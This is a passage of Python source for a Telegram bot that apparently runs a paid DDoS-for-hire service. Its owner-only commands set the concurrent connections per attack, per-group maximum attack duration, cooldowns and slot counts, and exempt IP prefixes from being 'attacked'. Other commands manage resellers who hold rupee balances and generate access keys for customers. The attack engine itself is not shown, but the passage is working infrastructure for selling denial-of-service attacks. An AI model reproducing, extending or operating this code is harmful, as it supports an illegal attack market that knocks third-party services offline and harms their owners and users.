        bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝐁𝐨𝐭 𝐝𝐞𝐥𝐞𝐭𝐞𝐝 𝐬𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
    else:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>{result}</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)


# ============ LOAD SAVED SETTINGS ============
saved_max_slots = get_setting('max_concurrent_slots', 4)
current_max_slots = saved_max_slots
current_concurrent_value = get_setting('concurrent_per_attack', 4)


# ============ CONVENIENCE COMMANDS ============

@bot.message_handler(commands=["setconcurrent"])
def set_concurrent_command(message):
    user_id = message.from_user.id

    if not is_owner(user_id):
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐛𝐲 𝐭𝐡𝐞 𝐨𝐰𝐧𝐞𝐫!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return

    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, f"{HTML_EMOJI.WARNING} 𝐔𝐬𝐚𝐠𝐞: <code>/setconcurrent &lt;value&gt;</code>\n\n𝐄𝐱𝐚𝐦𝐩𝐥𝐞: <code>/setconcurrent 4</code>\n\n𝐓𝐡𝐢𝐬 𝐬𝐞𝐭𝐬 𝐡𝐨𝐰 𝐦𝐚𝐧𝐲 𝐜𝐨𝐧𝐜𝐮𝐫𝐫𝐞𝐧𝐭 𝐜𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐨𝐧𝐬 𝐞𝐚𝐜𝐡 𝐀𝐏𝐈 𝐜𝐚𝐥𝐥 𝐮𝐬𝐞𝐬.", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return

    try:
        value = int(command_parts[1])
        if value < 1:
            value = 1
        if value > 10:
            value = 10

        set_concurrent_limit(value)
        bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝐂𝐨𝐧𝐜𝐮𝐫𝐫𝐞𝐧𝐭 𝐩𝐞𝐫 𝐚𝐭𝐭𝐚𝐜𝐤 𝐬𝐞𝐭 𝐭𝐨: {value}</b>\n\n𝐄𝐚𝐜𝐡 𝐀𝐏𝐈 𝐜𝐚𝐥𝐥 𝐰𝐢𝐥𝐥 𝐮𝐬𝐞 {value} 𝐜𝐨𝐧𝐜𝐮𝐫𝐫𝐞𝐧𝐭 𝐜𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐨𝐧𝐬.", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
    except:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐧𝐮𝐦𝐛𝐞𝐫!</b> 𝐔𝐬𝐞: <code>/setconcurrent &lt;value&gt;</code>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)


@bot.message_handler(commands=["setgrp"])
def set_group_config_command(message):
    user_id = message.from_user.id

    if not is_owner(user_id):
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐛𝐲 𝐭𝐡𝐞 𝐨𝐰𝐧𝐞𝐫!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return

    command_parts = message.text.split()
    if len(command_parts) != 4:
        bot.reply_to(message, f"{HTML_EMOJI.WARNING} 𝐔𝐬𝐚𝐠𝐞: <code>/setgrp &lt;group_id&gt; &lt;setting&gt; &lt;value&gt;</code>\n\n𝐒𝐞𝐭𝐭𝐢𝐧𝐠𝐬: max_time, cooldown, max_slots, feedback\n\n𝐄𝐱𝐚𝐦𝐩𝐥𝐞: <code>/setgrp -100123456789 max_time 300</code>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return

    group_id = command_parts[1]
    setting = command_parts[2].lower()

    try:
        value = int(command_parts[3])
    except:
        if setting == "feedback":
            value_str = command_parts[3].lower()
            if value_str == "on":
                set_group_feedback_required(group_id, True)
                bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝐆𝐫𝐨𝐮𝐩 {group_id} 𝐟𝐞𝐞𝐝𝐛𝐚𝐜𝐤 𝐫𝐞𝐪𝐮𝐢𝐫𝐞𝐝 𝐬𝐞𝐭 𝐭𝐨 𝐎𝐍!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
            elif value_str == "off":
                set_group_feedback_required(group_id, False)
                bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝐆𝐫𝐨𝐮𝐩 {group_id} 𝐟𝐞𝐞𝐝𝐛𝐚𝐜𝐤 𝐫𝐞𝐪𝐮𝐢𝐫𝐞𝐝 𝐬𝐞𝐭 𝐭𝐨 𝐎𝐅𝐅!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
            else:
                bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐯𝐚𝐥𝐮𝐞!</b> 𝐔𝐬𝐞 'on' 𝐨𝐫 'off' 𝐟𝐨𝐫 𝐟𝐞𝐞𝐝𝐛𝐚𝐜𝐤.", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
            return
        else:
            bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐯𝐚𝐥𝐮𝐞!</b> 𝐌𝐮𝐬𝐭 𝐛𝐞 𝐚 𝐧𝐮𝐦𝐛𝐞𝐫.", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
            return

    if setting == "max_time":
        if value < MIN_ATTACK_TIME:
            bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝐌𝐚𝐱 𝐭𝐢𝐦𝐞 𝐦𝐮𝐬𝐭 𝐛𝐞 𝐚𝐭 𝐥𝐞𝐚𝐬𝐭 {MIN_ATTACK_TIME} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
            return
        set_group_max_attack_time(group_id, value)
        bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝐆𝐫𝐨𝐮𝐩 {group_id} 𝐦𝐚𝐱 𝐚𝐭𝐭𝐚𝐜𝐤 𝐭𝐢𝐦𝐞 𝐬𝐞𝐭 𝐭𝐨 {value} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)

    elif setting == "cooldown":
        if value < 0:
            bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧 𝐜𝐚𝐧𝐧𝐨𝐭 𝐛𝐞 𝐧𝐞𝐠𝐚𝐭𝐢𝐯𝐞!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
            return
        set_group_cooldown_time(group_id, value)
        bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝐆𝐫𝐨𝐮𝐩 {group_id} 𝐜𝐨𝐨𝐥𝐝𝐨𝐰𝐧 𝐬𝐞𝐭 𝐭𝐨 {value} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)

    elif setting == "max_slots":
        if value < 1 or value > 10:
            bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝐌𝐚𝐱 𝐬𝐥𝐨𝐭𝐬 𝐦𝐮𝐬𝐭 𝐛𝐞 𝐛𝐞𝐭𝐰𝐞𝐞𝐧 1 𝐚𝐧𝐝 10!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
            return
        set_group_max_slots(group_id, value)
        bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝐆𝐫𝐨𝐮𝐩 {group_id} 𝐦𝐚𝐱 𝐬𝐥𝐨𝐭𝐬 𝐬𝐞𝐭 𝐭𝐨 {value}!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)

    else:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐬𝐞𝐭𝐭𝐢𝐧𝐠!</b> 𝐔𝐬𝐞: max_time, cooldown, max_slots, feedback", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)


@bot.message_handler(commands=["blockip"])
def block_ip_command(message):
    user_id = message.from_user.id

    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐛𝐲 𝐭𝐡𝐞 𝐨𝐰𝐧𝐞𝐫!</b>", reply_to=message)
        return

    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝐔𝐬𝐚𝐠𝐞: <code>/blockip &lt;ip_prefix&gt;</code>\n\n𝐄𝐱𝐚𝐦𝐩𝐥𝐞: <code>/blockip 20.204</code>\n\n𝐓𝐡𝐢𝐬 𝐛𝐥𝐨𝐜𝐤𝐬 𝐚𝐥𝐥 𝐈𝐏𝐬 𝐬𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐰𝐢𝐭𝐡 20.204", reply_to=message)
        return

    ip_prefix = command_parts[1]

    if add_blocked_ip(ip_prefix):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝐈𝐏 𝐩𝐫𝐞𝐟𝐢𝐱 <code>{ip_prefix}*</code> 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐛𝐥𝐨𝐜𝐤𝐞𝐝!</b>\n\n𝐀𝐧𝐲 𝐈𝐏 𝐬𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐰𝐢𝐭𝐡 {ip_prefix} 𝐜𝐚𝐧𝐧𝐨𝐭 𝐛𝐞 𝐚𝐭𝐭𝐚𝐜𝐤𝐞𝐝.", reply_to=message)
    else:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐅𝐚𝐢𝐥𝐞𝐝 𝐭𝐨 𝐛𝐥𝐨𝐜𝐤 𝐈𝐏!</b>", reply_to=message)


@bot.message_handler(commands=["unblockip"])
def unblock_ip_command(message):
    user_id = message.from_user.id

    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐛𝐲 𝐭𝐡𝐞 𝐨𝐰𝐧𝐞𝐫!</b>", reply_to=message)
        return

    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝐔𝐬𝐚𝐠𝐞: <code>/unblockip &lt;ip_prefix&gt;</code>\n\n𝐄𝐱𝐚𝐦𝐩𝐥𝐞: <code>/unblockip 20.204</code>", reply_to=message)
        return

    ip_prefix = command_parts[1]

    if remove_blocked_ip(ip_prefix):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝐈𝐏 𝐩𝐫𝐞𝐟𝐢𝐱 <code>{ip_prefix}*</code> 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐮𝐧𝐛𝐥𝐨𝐜𝐤𝐞𝐝!</b>", reply_to=message)
    else:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐈𝐏 𝐩𝐫𝐞𝐟𝐢𝐱 <code>{ip_prefix}*</code> 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝 𝐢𝐧 𝐛𝐥𝐨𝐜𝐤𝐞𝐝 𝐥𝐢𝐬𝐭!</b>", reply_to=message)


@bot.message_handler(commands=["blockedips"])
def blocked_ips_command(message):
    user_id = message.from_user.id

    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐛𝐲 𝐭𝐡𝐞 𝐨𝐰𝐧𝐞𝐫!</b>", reply_to=message)
        return

    blocked = get_all_blocked_ips()

    if not blocked:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.DOCUMENT} 𝐍𝐨 𝐈𝐏𝐬 𝐚𝐫𝐞 𝐜𝐮𝐫𝐫𝐞𝐧𝐭𝐥𝐲 𝐛𝐥𝐨𝐜𝐤𝐞𝐝!", reply_to=message)
        return

    response = f"{HTML_EMOJI.BAN} <b>𝐁𝐋𝐎𝐂𝐊𝐄𝐃 𝐈𝐏𝐬 𝐋𝐈𝐒𝐓</b>\n\n"
    for i, ip_data in enumerate(blocked, 1):
        response += f"{i}. <code>{ip_data['ip']}*</code>\n"

    response += f"\n{HTML_EMOJI.STATS} 𝐓𝐨𝐭𝐚𝐥 𝐁𝐥𝐨𝐜𝐤𝐞𝐝 𝐏𝐫𝐞𝐟𝐢𝐱𝐞𝐬: {len(blocked)}"

    safe_send_message(message.chat.id, response, reply_to=message)


# ============ ADD RESELLER COMMAND ============

@bot.message_handler(commands=["add_reseller", "addreseller"])
def add_reseller_command(message):
    user_id = message.from_user.id

    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐛𝐲 𝐭𝐡𝐞 𝐨𝐰𝐧𝐞𝐫!</b>", reply_to=message)
        return

    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝐔𝐬𝐚𝐠𝐞: <code>/add_reseller &lt;id or @username&gt;</code>", reply_to=message)
        return

    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐔𝐬𝐞𝐫 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝!</b> 𝐀𝐬𝐤 𝐭𝐡𝐞𝐦 𝐭𝐨 𝐮𝐬𝐞 /id 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐟𝐢𝐫𝐬𝐭.", reply_to=message)
        return

    existing = resellers_collection.find_one({'user_id': reseller_id})
    if existing:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐓𝐡𝐢𝐬 𝐮𝐬𝐞𝐫 𝐢𝐬 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐚 𝐫𝐞𝐬𝐞𝐥𝐥𝐞𝐫!</b>", reply_to=message)
        return

    reseller_doc = {
        'user_id': reseller_id,
        'username': resolved_name,
        'balance': 0,
        'added_at': datetime.now(),
        'added_by': user_id,
        'blocked': False,
        'total_keys_generated': 0
    }

    resellers_collection.insert_one(reseller_doc)

    try:
        if bot:
            bot.send_message(reseller_id, f"{HTML_EMOJI.PARTY} <b>𝐂𝐨𝐧𝐠𝐫𝐚𝐭𝐮𝐥𝐚𝐭𝐢𝐨𝐧𝐬! 𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐰 𝐚 𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫!</b>\n\n{HTML_EMOJI.MONEY} 𝐔𝐬𝐞 /mysaldo 𝐭𝐨 𝐜𝐡𝐞𝐜𝐤 𝐛𝐚𝐥𝐚𝐧𝐜𝐞\n{HTML_EMOJI.KEY} 𝐔𝐬𝐞 /gen 𝐭𝐨 𝐠𝐞𝐧𝐞𝐫𝐚𝐭𝐞 𝐤𝐞𝐲𝐬\n{HTML_EMOJI.CREDIT} 𝐔𝐬𝐞 /prices 𝐭𝐨 𝐬𝐞𝐞 𝐩𝐫𝐢𝐜𝐢𝐧𝐠", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
    except:
        pass

    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫 𝐚𝐝𝐝𝐞𝐝!</b>\n\n{HTML_EMOJI.PROFILE} 𝐔𝐬𝐞𝐫: {display}\n{HTML_EMOJI.PROFILE} 𝐈𝐃: {reseller_id}\n{HTML_EMOJI.MONEY} 𝐁𝐚𝐥𝐚𝐧𝐜𝐞: 0 𝐑𝐬", reply_to=message)


@bot.message_handler(commands=["remove_reseller", "removereseller"])
def remove_reseller_command(message):
    user_id = message.from_user.id

    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐛𝐲 𝐭𝐡𝐞 𝐨𝐰𝐧𝐞𝐫!</b>", reply_to=message)
        return

    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝐔𝐬𝐚𝐠𝐞: <code>/remove_reseller &lt;id or @username&gt;</code>", reply_to=message)
        return

    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐔𝐬𝐞𝐫 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝!</b>", reply_to=message)
        return

    result = resellers_collection.delete_one({'user_id': reseller_id})

    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    if result.deleted_count > 0:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫 {display} 𝐫𝐞𝐦𝐨𝐯𝐞𝐝!</b>", reply_to=message)
    else:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝!</b>", reply_to=message)


@bot.message_handler(commands=["block_reseller", "blockreseller"])
def block_reseller_command(message):
    user_id = message.from_user.id

    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐛𝐲 𝐭𝐡𝐞 𝐨𝐰𝐧𝐞𝐫!</b>", reply_to=message)
        return

    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝐔𝐬𝐚𝐠𝐞: <code>/block_reseller &lt;id or @username&gt;</code>", reply_to=message)
        return

    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐔𝐬𝐞𝐫 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝!</b>", reply_to=message)
        return

    result = resellers_collection.update_one({'user_id': reseller_id}, {'$set': {'blocked': True}})

    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    if result.modified_count > 0:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.BAN} <b>𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫 {display} 𝐛𝐥𝐨𝐜𝐤𝐞𝐝!</b>", reply_to=message)
    else:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝 𝐨𝐫 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐛𝐥𝐨𝐜𝐤𝐞𝐝!</b>", reply_to=message)


@bot.message_handler(commands=["unblock_reseller", "unblockreseller"])
def unblock_reseller_command(message):
    user_id = message.from_user.id

    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐛𝐲 𝐭𝐡𝐞 𝐨𝐰𝐧𝐞𝐫!</b>", reply_to=message)
        return

    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝐔𝐬𝐚𝐠𝐞: <code>/unblock_reseller &lt;id or @username&gt;</code>", reply_to=message)
        return

    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐔𝐬𝐞𝐫 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝!</b>", reply_to=message)
        return

    result = resellers_collection.update_one({'user_id': reseller_id}, {'$set': {'blocked': False}})

    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    if result.modified_count > 0:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫 {display} 𝐮𝐧𝐛𝐥𝐨𝐜𝐤𝐞𝐝!</b>", reply_to=message)
    else:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝!</b>", reply_to=message)


@bot.message_handler(commands=["all_resellers", "allresellers"])
def all_resellers_command(message):
    user_id = message.from_user.id

    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐛𝐲 𝐭𝐡𝐞 𝐨𝐰𝐧𝐞𝐫!</b>", reply_to=message)
        return

    resellers = list(resellers_collection.find())

    if not resellers:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.DOCUMENT} 𝐍𝐨 𝐫𝐞𝐬𝐞𝐥𝐥𝐞𝐫𝐬 𝐟𝐨𝐮𝐧𝐝!", reply_to=message)
        return

    response = "═══════════════════════════\n"
    response += f"{HTML_EMOJI.USERS} 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐋𝐈𝐒𝐓\n"
    response += "═══════════════════════════\n\n"

    active_resellers = [r for r in resellers if not r.get('blocked')]
    blocked_resellers = [r for r in resellers if r.get('blocked')]

    response += f"{HTML_EMOJI.CHECKMARK} 𝐀𝐂𝐓𝐈𝐕𝐄: {len(active_resellers)}\n"
    response += "───────────────────────────\n"

    for i, r in enumerate(active_resellers[:10], 1):
        response += f"{i}. {HTML_EMOJI.PROFILE} <code>{r['user_id']}</code>\n"
        response += f"   {HTML_EMOJI.CREDIT} 𝐁𝐚𝐥𝐚𝐧𝐜𝐞: {r.get('balance', 0)} 𝐑𝐬\n"
        response += f"   {HTML_EMOJI.KEY} 𝐊𝐞𝐲𝐬: {r.get('total_keys_generated', 0)}\n\n"

    if blocked_resellers:
        response += f"{HTML_EMOJI.CROSS} 𝐁𝐋𝐎𝐂𝐊𝐄𝐃: {len(blocked_resellers)}\n"
        response += "───────────────────────────\n"
        for i, r in enumerate(blocked_resellers[:5], 1):
            response += f"{i}. {HTML_EMOJI.PROFILE} <code>{r['user_id']}</code>\n"

    response += "\n═══════════════════════════"

    safe_send_message(message.chat.id, response, reply_to=message)


# ============ SALDO COMMANDS ============

@bot.message_handler(commands=["saldoadd"])
def saldo_add_command(message):
    user_id = message.from_user.id

    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐛𝐲 𝐭𝐡𝐞 𝐨𝐰𝐧𝐞𝐫!</b>", reply_to=message)
        return

    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝐔𝐬𝐚𝐠𝐞: <code>/saldoadd &lt;id or @username&gt; &lt;amount&gt;</code>", reply_to=message)
        return

    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐔𝐬𝐞𝐫 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝!</b>", reply_to=message)
        return

    try:
        amount = int(command_parts[2])
    except ValueError:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐚𝐦𝐨𝐮𝐧𝐭!</b>", reply_to=message)
        return

    if amount <= 0:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐀𝐦𝐨𝐮𝐧𝐭 𝐦𝐮𝐬𝐭 𝐛𝐞 𝐩𝐨𝐬𝐢𝐭𝐢𝐯𝐞!</b>", reply_to=message)
        return

    reseller = resellers_collection.find_one({'user_id': reseller_id})
    if not reseller:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝!</b>", reply_to=message)
        return

    new_balance = reseller.get('balance', 0) + amount
    resellers_collection.update_one({'user_id': reseller_id}, {'$set': {'balance': new_balance}})

    try:
        if bot:
            bot.send_message(reseller_id, f"{HTML_EMOJI.MONEY} <b>𝐁𝐚𝐥𝐚𝐧𝐜𝐞 𝐀𝐝𝐝𝐞𝐝!</b>\n\n{HTML_EMOJI.ARROW_RIGHT} 𝐀𝐝𝐝𝐞𝐝: {amount} 𝐑𝐬\n{HTML_EMOJI.CREDIT} 𝐍𝐞𝐰 𝐁𝐚𝐥𝐚𝐧𝐜𝐞: {new_balance} 𝐑𝐬", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
    except:
        pass

    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝐁𝐚𝐥𝐚𝐧𝐜𝐞 𝐀𝐝𝐝𝐞𝐝!</b>\n\n{HTML_EMOJI.PROFILE} 𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫: {display}\n{HTML_EMOJI.PROFILE} 𝐈𝐃: {reseller_id}\n{HTML_EMOJI.ARROW_RIGHT} 𝐀𝐝𝐝𝐞𝐝: {amount} 𝐑𝐬\n{HTML_EMOJI.CREDIT} 𝐍𝐞𝐰 𝐁𝐚𝐥𝐚𝐧𝐜𝐞: {new_balance} 𝐑𝐬", reply_to=message)


@bot.message_handler(commands=["saldoremove"])
def saldo_remove_command(message):
    user_id = message.from_user.id

    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐛𝐲 𝐭𝐡𝐞 𝐨𝐰𝐧𝐞𝐫!</b>", reply_to=message)
        return

    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝐔𝐬𝐚𝐠𝐞: <code>/saldoremove &lt;id or @username&gt; &lt;amount&gt;</code>", reply_to=message)
        return

    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐔𝐬𝐞𝐫 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝!</b>", reply_to=message)
        return

    try:
        amount = int(command_parts[2])
    except ValueError:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐚𝐦𝐨𝐮𝐧𝐭!</b>", reply_to=message)
        return

    reseller = resellers_collection.find_one({'user_id': reseller_id})
    if not reseller:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝!</b>", reply_to=message)
        return

    new_balance = max(0, reseller.get('balance', 0) - amount)
    resellers_collection.update_one({'user_id': reseller_id}, {'$set': {'balance': new_balance}})

    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
